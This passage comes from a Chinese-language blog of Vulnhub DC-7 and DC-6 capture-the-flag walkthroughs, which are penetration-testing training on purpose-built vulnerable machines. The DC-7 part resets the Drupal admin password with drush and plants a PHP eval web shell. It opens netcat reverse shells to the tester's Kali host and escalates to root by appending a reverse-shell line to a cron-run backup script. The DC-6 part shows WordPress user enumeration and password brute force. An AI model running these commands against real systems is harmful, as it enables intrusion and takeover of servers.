[success]</span><br><span class="line"></span><br><span class="line">From root@dc-7 Thu Aug 29 23:00:12 2019</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Thu, 29 Aug 2019 23:00:12 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1i3K28-0000Ll-11</span><br><span class="line">        for root@dc-7; Thu, 29 Aug 2019 23:00:12 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1i3K28-0000Ll-11@dc-7&gt;</span><br><span class="line">Date: Thu, 29 Aug 2019 23:00:12 +1000</span><br><span class="line"></span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line"></span><br><span class="line">From root@dc-7 Fri Aug 30 00:15:18 2019</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Fri, 30 Aug 2019 00:15:18 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1i3LCo-0000Eb-02</span><br><span class="line">        for root@dc-7; Fri, 30 Aug 2019 00:15:18 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1i3LCo-0000Eb-02@dc-7&gt;</span><br><span class="line">Date: Fri, 30 Aug 2019 00:15:18 +1000</span><br><span class="line"></span><br><span class="line">rm: cannot remove &#x27;/home/dc7user/backups/*&#x27;: No such file or directory</span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line"></span><br><span class="line">From root@dc-7 Fri Aug 30 03:15:17 2019</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Fri, 30 Aug 2019 03:15:17 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1i3O0y-0000Ed-To</span><br><span class="line">        for root@dc-7; Fri, 30 Aug 2019 03:15:17 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1i3O0y-0000Ed-To@dc-7&gt;</span><br><span class="line">Date: Fri, 30 Aug 2019 03:15:17 +1000</span><br><span class="line"></span><br><span class="line">rm: cannot remove &#x27;/home/dc7user/backups/*&#x27;: No such file or directory</span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br></pre></td></tr></table></figure><ul><li><strong>发现在<code>/opt/scripts/</code> 有个可以执行的脚本文件 <code>backups.sh</code></strong></li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220914124622499.png" alt="image-20220914124622499"></p><ul><li>进入<code>/opt/scripts/</code>查看</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220914124815236.png" alt="image-20220914124815236"></p><ul><li>一封邮件?(暂时先不管)</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220914124921191.png" alt="image-20220914124921191"></p><ul><li><strong><code>drush</code> 是<code>drupal shell</code> 专门管理<code>drupal</code>站点的<code>shell</code></strong></li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220914125207147.png" alt="image-20220914125207147"></p><ul><li><strong>进入到<code>/var/www/html</code>目录下，使用<code>drush</code>命令修改admin用户的密码为<code>admin</code></strong></li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220914125508458.png" alt="image-20220914125508458"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drush user-password admin --password=&#x27;admin&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220914130019573.png" alt="image-20220914130019573"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">There have been more than 5 failed login attempts for this account. It is temporarily blocked. Try again later or request a new password.</span><br><span class="line">此帐户已尝试登录失败5次以上。它被暂时封锁了。请稍后再试或请求新密码。</span><br><span class="line"></span><br><span class="line">解决方法：使用命令：drush php-eval &#x27;db_query(&quot;DELETE FROMflood&quot;);&#x27; 登入成功！！！</span><br></pre></td></tr></table></figure><ul><li>上面的一封信</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">dc7user@dc-7:/var/mail$ cat dc7user </span><br><span class="line">From root@dc-7 Wed Sep 14 14:30:10 2022</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Wed, 14 Sep 2022 14:30:10 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1oYK2M-0000HX-Me</span><br><span class="line">        for root@dc-7; Wed, 14 Sep 2022 14:30:10 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1oYK2M-0000HX-Me@dc-7&gt;</span><br><span class="line">Date: Wed, 14 Sep 2022 14:30:10 +1000</span><br><span class="line"></span><br><span class="line">rm: cannot remove &#x27;/home/dc7user/backups/*&#x27;: No such file or directory</span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line"></span><br><span class="line">From root@dc-7 Wed Sep 14 14:45:05 2022</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Wed, 14 Sep 2022 14:45:05 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1oYKGn-0000Ig-Ci</span><br><span class="line">        for root@dc-7; Wed, 14 Sep 2022 14:45:05 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1oYKGn-0000Ig-Ci@dc-7&gt;</span><br><span class="line">Date: Wed, 14 Sep 2022 14:45:05 +1000</span><br><span class="line"></span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line"></span><br><span class="line">From root@dc-7 Wed Sep 14 15:00:05 2022</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Wed, 14 Sep 2022 15:00:05 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1oYKVJ-0000KR-5Z</span><br><span class="line">        for root@dc-7; Wed, 14 Sep 2022 15:00:05 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1oYKVJ-0000KR-5Z@dc-7&gt;</span><br><span class="line">Date: Wed, 14 Sep 2022 15:00:05 +1000</span><br><span class="line"></span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line"></span><br><span class="line">From root@dc-7 Wed Sep 14 15:15:05 2022</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Wed, 14 Sep 2022 15:15:05 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1oYKjp-0000LO-Bg</span><br><span class="line">        for root@dc-7; Wed, 14 Sep 2022 15:15:05 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1oYKjp-0000LO-Bg@dc-7&gt;</span><br><span class="line">Date: Wed, 14 Sep 2022 15:15:05 +1000</span><br><span class="line"></span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line"></span><br><span class="line">From root@dc-7 Wed Sep 14 15:30:05 2022</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Wed, 14 Sep 2022 15:30:05 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1oYKyL-0000M8-FW</span><br><span class="line">        for root@dc-7; Wed, 14 Sep 2022 15:30:05 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1oYKyL-0000M8-FW@dc-7&gt;</span><br><span class="line">Date: Wed, 14 Sep 2022 15:30:05 +1000</span><br><span class="line"></span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br></pre></td></tr></table></figure><h1 id="进入网站后台"><a href="#进入网站后台" class="headerlink" title="进入网站后台"></a>进入网站后台</h1><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220914130250894.png" alt="image-20220914130250894"></p><p><strong>登入成功找到 在Content—&gt;Add content–&gt;Basic page下 需要添加一个PHP模板</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.drupal.org/project/php  <span class="comment"># 插件下载地址</span></span><br><span class="line">https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz <span class="comment">#模块包</span></span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220914130802690.png" alt="image-20220914130802690"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220914130903628.png" alt="image-20220914130903628"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220914131017726.png" alt="image-20220914131017726"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220914131029489.png" alt="image-20220914131029489"></p><ul><li>搜索php 点击安装</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220914131620408.png" alt="image-20220914131620408"></p><ul><li>安装成功</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220914131656845.png" alt="image-20220914131656845"></p><ul><li><strong>添加一句话,不要忘记点击<code>save</code></strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GetShell</span><br><span class="line">&lt;?php</span><br><span class="line">@eval($_REQUEST[cmd]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220914131931124.png" alt="image-20220914131931124"></p><ul><li>连接</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220914132238640.png" alt="image-20220914132238640"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220914132304474.png" alt="image-20220914132304474"></p><ul><li><strong>把<code>shell</code>反弹到<code>kali </code></strong></li></ul><ol><li>kali 监听</li></ol><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220914132443810.png" alt="image-20220914132443810"></p><ol start="2"><li>蚁剑</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.169.220 4444 -e /bin/sh</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220914132838453.png" alt="image-20220914132838453"></p><ol start="3"><li>设置交互</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220914132925247.png" alt="image-20220914132925247"></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><ul><li><strong>在<code>/opt/scripts</code>目录下的<code>backups.sh</code>脚本文件所属组是<code>www-data</code>，所以www-data用户可以对这个脚本文件进行操作，并且这个脚本文件定时执行可以利用它来反弹<code>shell</code></strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 192.168.169.220 1234 &gt;/tmp/f&quot; &gt;&gt; backups.sh</span><br></pre></td></tr></table></figure><ol><li>kali 监听</li></ol><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220914134201445.png" alt="image-20220914134201445"></p><ol start="2"><li>执行命令 - (记住要填写kali的ip)</li></ol><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220914140505217.png" alt="image-20220914140505217"></p><ol start="3"><li><p>这个shell反弹会很慢.</p></li><li><p>反弹回来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure></li><li><p><strong><code>cat /root/theflag.txt</code></strong></p></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub靶机DC系列-DC6</title>
      <link href="/archives/331d7522.html"/>
      <url>/archives/331d7522.html</url>
      
        <content type="html"><![CDATA[<h1 id="靶场简介"><a href="#靶场简介" class="headerlink" title="靶场简介"></a>靶场简介</h1><ul><li><strong>Name</strong>: DC: 6</li><li><strong>Date release</strong>: 26 Apr 2019</li><li><strong>Author</strong>: <a href="http://www.vulnhub.com/author/dcau,610/">DCAU</a></li><li><strong>Series</strong>: <a href="http://www.vulnhub.com/series/dc,199/">DC</a></li></ul><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>DC-6 是另一个特意建造的易受攻击的实验室，旨在获得渗透测试领域的经验。</p><p>这不是一个过于困难的挑战，因此对初学者来说应该很棒。</p><p>这一挑战的最终目标是获得根并阅读唯一的标志。</p><p>必须具备 Linux 技能和熟悉 Linux 命令行，以及一些基本渗透测试工具的经验。</p><p>对于初学者来说，谷歌可以提供很大的帮助，但你可以随时在@DCAU7 上给我发推文，寻求帮助，让你重新开始。但请注意：我不会给你答案，相反，我会给你一个关于如何前进的想法。</p><h2 id="技术信息"><a href="#技术信息" class="headerlink" title="技术信息"></a>技术信息</h2><p>DC-6 是基于 Debian 64 位构建的 VirtualBox VM，但在大多数 PC 上运行它应该没有任何问题。</p><p>我已经在 VMWare Player 上对此进行了测试，但如果在 VMware 中运行此 VM 有任何问题，请通读此内容。</p><p>它当前配置为桥接网络，但是，可以根据您的要求进行更改。网络配置为 DHCP。</p><p>安装很简单 - 下载它，解压缩，然后将它导入 VirtualBox 或 VMWare，然后就可以了。</p><p><strong>注意：您需要在您的渗透测试设备上编辑您的主机文件，以便它读取如下内容：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.0.142 wordy</span><br></pre></td></tr></table></figure><p>注意：我以 192.168.0.142 为例。您需要使用常规方法来确定 VM 的 IP 地址，并进行相应调整。</p><p>这个非常重要。</p><p>是的，它是另一个基于 WordPress 的虚拟机（虽然只是我的第二个）。</p><h2 id="重要的"><a href="#重要的" class="headerlink" title="重要的"></a>重要的</h2><p>虽然使用此 VM 应该没有问题，但通过下载它，您将对此 VM 可能造成的任何意外损坏承担全部责任。</p><p>这么说应该没什么问题，但我觉得有必要把它扔在那里以防万一。</p><h2 id="接触"><a href="#接触" class="headerlink" title="接触"></a>接触</h2><p>我也很想听听人们如何解决这些挑战，所以如果你准备写一个演练，请这样做并给我一个链接，或者，在 Twitter 上关注我，然后给我发消息（你可以如果您愿意，请在您给我 DM 后取消关注）。</p><p>可以通过 Twitter 联系我 - @DCAU7</p><h2 id="线索"><a href="#线索" class="headerlink" title="线索"></a>线索</h2><p>好吧，这并不是一个真正的线索，但对于那些只想继续工作的人来说，更多的是一些“我们不想花五年时间等待某个过程完成”的建议。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt 这应该可以为您节省几年时间。;-)</span><br></pre></td></tr></table></figure><h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912091433607.png" alt="image-20220912091433607"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali 192.168.169.220</span><br><span class="line">dc-6 192.168.169.232</span><br></pre></td></tr></table></figure><h2 id="根据描述修改-host"><a href="#根据描述修改-host" class="headerlink" title="根据描述修改 host"></a>根据描述修改 host</h2><p>格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.169.232  wordy</span><br></pre></td></tr></table></figure><p>kali linux</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912092217947.png" alt="image-20220912092217947"></p><p>windows</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\drivers\etc</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912092114047.png" alt="image-20220912092114047"></p><h2 id="扫描目标ip"><a href="#扫描目标ip" class="headerlink" title="扫描目标ip"></a>扫描目标ip</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912092347729.png" alt="image-20220912092347729"></p><ul><li>ssh 和 http</li><li>访问</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912092509308.png" alt="image-20220912092509308"></p><h2 id="开扫"><a href="#开扫" class="headerlink" title="开扫"></a>开扫</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordy/ -e</span><br></pre></td></tr></table></figure><ul><li>找到用户</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912093546822.png" alt="image-20220912093546822"></p><ul><li><p>把这些用户名 user.txt 保存</p></li><li><p>根据上面的线索,作者给出爆破的字典</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt </span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912093909278.png" alt="image-20220912093909278"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912094432887.png" alt="image-20220912094432887"></p><ul><li>在rockyou.txt中查找包含k01的字符串，并写入文件passwords.txt</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912094545093.png" alt="image-20220912094545093"></p><h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordy -U user.txt -P passwords.txt  </span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912095337051.png" alt="image-20220912095337051"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Username: mark</span><br><span class="line">Password: helpdesk01</span><br></pre></td></tr></table></figure><ul><li>登录后台</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://wordy/wp-login.php?</span><br></pre></td></tr></table></figure><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912095507386.png" alt="image-20220912095507386"></p><ul><li>找到一个 输入框 可以执行命令,需要修改一下长度限制</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912100136064.png" alt="image-20220912100136064"></p><ul><li>搜索可以利用的漏洞</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912102402561.png" alt="image-20220912102402561"></p><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912102548488.png" alt="image-20220912102548488"></p><ul><li>运行脚本 根据提示 填入相应的信息</li></ul><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912102748313.png" alt="image-20220912102748313"></p><ul><li>交互式shell 直接停止运行 放弃</li></ul><h2 